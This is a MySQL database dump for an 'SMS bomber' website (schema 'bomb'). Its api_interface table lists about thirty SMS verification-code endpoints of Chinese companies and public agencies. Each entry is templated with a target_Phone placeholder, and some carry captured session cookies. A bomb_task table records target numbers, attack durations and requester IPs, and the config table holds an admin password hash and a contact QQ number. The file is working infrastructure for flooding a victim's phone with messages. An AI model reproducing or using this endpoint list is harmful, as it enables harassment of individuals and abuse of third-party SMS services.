/*
 Navicat Premium Data Transfer

 Source Server         : 阿里云香港
 Source Server Type    : MySQL
 Source Server Version : 50730
 Source Host           : 47.244.21.169:3306
 Source Schema         : bomb

 Target Server Type    : MySQL
 Target Server Version : 50730
 File Encoding         : 65001

 Date: 29/04/2020 18:56:22
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for api_interface
-- ----------------------------
DROP TABLE IF EXISTS `api_interface`;
CREATE TABLE `api_interface` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '主键',
  `name` varchar(255) DEFAULT NULL COMMENT 'APi名称',
  `url` varchar(1000) DEFAULT NULL COMMENT 'API地址',
  `type` char(4) DEFAULT NULL COMMENT '请求方式',
  `cookie` varchar(1000) DEFAULT NULL COMMENT 'cookie',
  `parm` varchar(1000) DEFAULT NULL COMMENT '请求参数JSON格式',
  `headers` varchar(1000) DEFAULT NULL COMMENT '请求头',
  `status` int(11) DEFAULT '0' COMMENT 'API状态 0启用 1暂停',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=38 DEFAULT CHARSET=utf8 COMMENT='短信API接口';

-- ----------------------------
-- Records of api_interface
-- ----------------------------
BEGIN;
INSERT INTO `api_interface` VALUES (6, '有讲', 'https://www.yojiang.cn/api/user/send_verify_code?phone=target_Phone', '0', 'guest_uuid=5e3626fd9b6dde14e9293bee; _xsrf=2|a63a71a2|6bfa82e8f3ff66bbf83b67c2a67a9cf5|1580823294; Hm_lvt_91f2894c14ed1eb5a6016e859758fb9c=1580825404; Hm_lpvt_91f2894c14ed1eb5a6016e859758fb9c=1580825404', '', '', 1);
INSERT INTO `api_interface` VALUES (7, '平安', 'https://m.health.pingan.com/mapi/smsCode.json?deviceId=5a4c935cbb6ff6ca&deviceType=SM-G9300&timestamp=1545122608&app=0&platform=3&app_key=PAHealth&osversion=23&info=&version=1.0.1&resolution=1440x2560&screenSize=22&netType=1&channel=m_h5&phone=target_Phone', '0', '', '', '', 1);
INSERT INTO `api_interface` VALUES (8, '智课', 'https://www.smartstudy.com/api/user-service/captcha/phone', '1', '', '{\"phone\":\"target_Phone\",\"countryCode\":\"86\",\"type\":\"authenticode\"}', '', 0);
INSERT INTO `api_interface` VALUES (9, '腾讯企业邮箱', 'https://exmail.qq.com/cgi-bin/bizmail_portal?action=send_sms&type=11&t=biz_rf_portal_mgr&ef=jsnew&resp_charset=UTF8&area=86&mobile=target_Phone', '0', '', '', '', 1);
INSERT INTO `api_interface` VALUES (10, '快手', 'https://id.kuaishou.com/pass/kuaishou/sms/requestMobileCode', '1', '', '{\"phone\":\"target_Phone\",\"countryCode\":\"+86\",\"type\":\"53\",\"sid\":\"kuaishou.live.web\"}', '', 1);
INSERT INTO `api_interface` VALUES (11, '金融好', 'http://jrh.financeun.com/Login/sendMessageCode3.html?mobile=target_Phone&mbid=197873&check=3', '0', 'PHPSESSID=q8h78o91qm30m5bl7lufkt3go3; jrh_visit_log=q8h78o91qm30m5bl7lufkt3go3; Hm_lvt_b627bb080fd97f01181b26820034cfcb=1580999339; UM_distinctid=1701ae772688ac-09ae1bde44e676-6701b35-144000-1701ae772699ca; CNZZDATA1276814029=219078261-1580999135-%7C1580999135; Hm_lpvt_b627bb080fd97f01181b26820034cfcb=1580999403', '', '', 0);
INSERT INTO `api_interface` VALUES (12, '爱思', 'https://developer.i4.cn/put/getMsgCode.xhtml?_=1580912157461&phoneNumber=target_Phone&codeType=6', '0', '', '', '', 1);
INSERT INTO `api_interface` VALUES (13, '天津企业登记', 'http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login', '1', '', '{\"TEMP\":\"1\",\"MOBILENO\":\"target_Phone\"}', '', 1);
INSERT INTO `api_interface` VALUES (14, '幕布', 'https://mubu.com/api/reg/send_login_reg_code', '1', 'JSESSIONID=85868DD70470B6ABD7B75F9E06DF7141; data_unique_id=b8faa788-9f4e-46e9-82f9-056f1cbc4655; csrf_token=5bb5b7c8-9c65-42f9-ac3b-a78aa5f0060c; SESSION=0ff368c1-535f-4d50-a41f-4eef1e1be048; language=en-US; country=US; data-unique-id=bf8e3e60-7818-11ea-9c8a-71ee3c9e3d51; _ga=GA1.2.1877227900.1586185828; _gid=GA1.2.1406433214.1586185828; _gat=1; reg_from=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DHj2yukD5O1qKO7-L83BKP5lmhdWuw9CTTR21B1OC4eW%26wd%3D%26eqid%3Dbe2488db00167400000000065e8b465b; reg_entrance=https%3A%2F%2Fmubu.com%2F; Hm_lvt_4426cbb0486a79ea049b4ad52d81b504=1586185829; SLARDAR_WEB_ID=e0dba7be-8da5-475e-b288-a144c404617c; reg_prepareId=171500b033b-171500b0283-42af-8b19-be54cc3baa04; Hm_lpvt_4426cbb0486a79ea049b4ad52d81b504=1586185831; reg_focusId=1224b420-dc88-42af-8b19-171500b063d', '{\"sendId\":\"1224b420-dc88-42af-8b19-be54cc3baa04\",\"phone\":\"target_Phone\"}', '', 0);
INSERT INTO `api_interface` VALUES (15, '汉薇商城', 'https://api.hanwin.com/v1_sms_index/getSmsCode', '1', '', '{\"share_id\":\"\",\"phone\":\"target_Phone\",\"scene\":\"register_login\"}', '', 1);
INSERT INTO `api_interface` VALUES (16, '颖时尚', 'https://back.santamonicaeyewear.com/api/member/v1/verification?checkCode=null&mobile=target_Phone', '0', '', '', '', 1);
INSERT INTO `api_interface` VALUES (17, '长吉物流', 'https://www.cjqy.com/freight-wap-web/register/sendMobileCode', '1', '', '{\"phoneNum\":\"target_Phone\"}', '', 0);
INSERT INTO `api_interface` VALUES (18, '平安保险', 'https://mobile.health.pingan.com/ehis-hl/ajax/sendOTP.action?smscc=ehiswxonly&phone=target_Phone', '0', '', '', '', 1);
INSERT INTO `api_interface` VALUES (19, '流量掌厅', 'http://wap.zt.raiyi.com/weixin/bind/verifyMobile?mobile=target_Phone&appCode=fc_wx&buyChannel=OfficialAccounts&vtype=0', '0', '', '', '', 1);
INSERT INTO `api_interface` VALUES (20, '河北省卫健委药具管理中心', 'https://lqj.tyjsfw.com/byt/t/napi/sms/sendSMS.do', '1', '', '{\"telephone\":\"target_Phone\",\"showLoading\":\"false\"}', '', 0);
INSERT INTO `api_interface` VALUES (21, '车卫士', 'https://client.uqbike.com/sms/sendAuthCode.do?accountId=5&phone=target_Phone', '0', '', '', '', 1);
INSERT INTO `api_interface` VALUES (22, '西拉代理', 'http://www.xiladaili.com/send_message?mobile=target_Phone', '0', '', '', '', 1);
INSERT INTO `api_interface` VALUES (23, 'PPTV', 'http://api.passport.pptv.com/checkImageCodeAndSendMsg?&scene=REG_PPTV_APP&deviceId=867830021000533&aliasName=target_Phone', '1', '', '', '', 1);
INSERT INTO `api_interface` VALUES (24, '有享云商', 'http://wd.yofogo.com/sso/verificationCodeForLogin?p=target_Phone', '1', '', '', '', 0);
INSERT INTO `api_interface` VALUES (25, '中国石化', 'http://jxcps.sinopec.com/sms/createSMS?phone=target_Phone&tempCode=wechat_zc', '1', '', '', '', 1);
INSERT INTO `api_interface` VALUES (26, '悬赏猫', 'http://system.xuanshangmao.com/rest/regist/code?phone=target_Phone', '1', '', '', '', 1);
INSERT INTO `api_interface` VALUES (27, '去哪儿网', 'https://user.qunar.com/webApi/logincode.jsp?mobile=target_Phone&vcode=&origin=wechat$$$qunar&action=register&type=implicit', '1', '', '', '', 1);
INSERT INTO `api_interface` VALUES (28, '58到家', 'http://user.daojia.com/mobile/getcode?mobile=target_Phone', '1', '', '', '', 1);
INSERT INTO `api_interface` VALUES (29, '高途课堂', 'http://api.gaotu100.com/user/v2/send_passcode?captcha_mode=NETEASE&type=3&mobile=target_Phone&code_type=0&', '1', '', '', '', 1);
INSERT INTO `api_interface` VALUES (30, '苏宁', 'http://reg.suning.com/ajax/code/sms.do?scen=WAP_WCHAT_PUB_ACCT_UNION_LOGIN_MOBILE_REG&phoneNum=target_Phone&uid=&code=', '1', '', '', '', 1);
INSERT INTO `api_interface` VALUES (31, '苏宁2', 'http://reg.suning.com/srs-web/ajax/code/sms.do?scen=PERSON_MOBILE_REG_VERIFY_MOBILE&phoneNum=target_Phone&uid=&code=', '1', '', '', '', 1);
INSERT INTO `api_interface` VALUES (32, '家有学霸', 'https://api.jiayouxueba.cn/api/v3/sms/getcode?mobile=target_Phone&type=1', '0', '', '', '', 1);
INSERT INTO `api_interface` VALUES (33, '才米公社', 'https://activity.caimigs.com/api/register/sendSms?mobile=target_Phone', '1', '', '', '', 1);
INSERT INTO `api_interface` VALUES (34, '凤凰网', 'http://id.ifeng.com/api/simplesendmsg?mobile=target_Phone&comefrom=7&auth=&msgtype=0', '1', '', '', '', 1);
INSERT INTO `api_interface` VALUES (35, '玖富商城', 'http://api.pinzhishangcheng.cn/user/sendValidCode?version=5.5.5&fromType=4&mobile=target_Phone&type=1&unionid=&device=&isAfterPic=0', '1', '', '', '', 1);
INSERT INTO `api_interface` VALUES (36, '不知道啥', 'http://211.156.201.12:8088/youzheng//ems/security?phone=target_Phone', '1', '', '', '', 1);
INSERT INTO `api_interface` VALUES (37, '小兵驿站', 'http://api.xtgyl.cn/index.php/api_v1/api.app.login/sendCaptcha?mobile=target_Phone&type=sms&action=register', '1', '', '', '', 1);
COMMIT;

-- ----------------------------
-- Table structure for bomb_task
-- ----------------------------
DROP TABLE IF EXISTS `bomb_task`;
CREATE TABLE `bomb_task` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '主键ID',
  `name` varchar(64) DEFAULT NULL COMMENT '请求人名称',
  `attack_time` int(11) DEFAULT NULL COMMENT '攻击时间(分钟)',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `phone` varchar(64) DEFAULT NULL COMMENT '攻击号码',
  `start_time` datetime DEFAULT NULL COMMENT '开始时间',
  `is_attack` int(11) DEFAULT NULL COMMENT '0 未开始 1 进行中 2 已完成',
  `request_ip` varchar(15) DEFAULT NULL COMMENT '请求IP',
  `request_device` varchar(255) DEFAULT NULL COMMENT '请求设备',
  `request_browser` varchar(255) DEFAULT NULL COMMENT '请求浏览器',
  PRIMARY KEY (`id`),
  KEY `idx_` (`name`,`attack_time`,`create_time`,`phone`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8 COMMENT='轰炸任务';

-- ----------------------------
-- Table structure for config
-- ----------------------------
DROP TABLE IF EXISTS `config`;
CREATE TABLE `config` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '主键ID',
  `key` varchar(255) NOT NULL COMMENT 'KEY',
  `value` varchar(1000) NOT NULL COMMENT '值',
  PRIMARY KEY (`id`),
  UNIQUE KEY `index_key` (`key`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8 COMMENT='网站配置';

-- ----------------------------
-- Records of config
-- ----------------------------
BEGIN;
INSERT INTO `config` VALUES (1, 'username', 'admin');
INSERT INTO `config` VALUES (2, 'password', '$2a$10$OBLK419I/DQl7AJ8iWZ/Juzxse2berh3YLoIRX2zOY8eaicwDyely');
INSERT INTO `config` VALUES (3, 'site_name', '炸你妹');
INSERT INTO `config` VALUES (4, 'domain', 'http://www.zhanimei.com');
INSERT INTO `config` VALUES (5, 'site_title', '炸你妹啊啊啊');
INSERT INTO `config` VALUES (6, 'keywords', '');
INSERT INTO `config` VALUES (7, 'descript', '');
INSERT INTO `config` VALUES (8, 'copyright', 'Copyright © 2020 ');
INSERT INTO `config` VALUES (9, 'proxy_api', '');
INSERT INTO `config` VALUES (10, 'max_time', '3');
INSERT INTO `config` VALUES (11, 'qq_value', '1678268042');
INSERT INTO `config` VALUES (12, 'test_phone', '133333333333');
INSERT INTO `config` VALUES (13, 'bulletin', ' <h1>汉化</h1>啊啊啊啊wwwwwwwaaaasssssssss33333');
INSERT INTO `config` VALUES (14, 'max_task', '3');
COMMIT;

-- ----------------------------
-- Table structure for whitelist
-- ----------------------------
DROP TABLE IF EXISTS `whitelist`;
CREATE TABLE `whitelist` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '主键',
  `phone` varchar(64) DEFAULT NULL COMMENT '手机号码',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='白名单';

SET FOREIGN_KEY_CHECKS = 1;
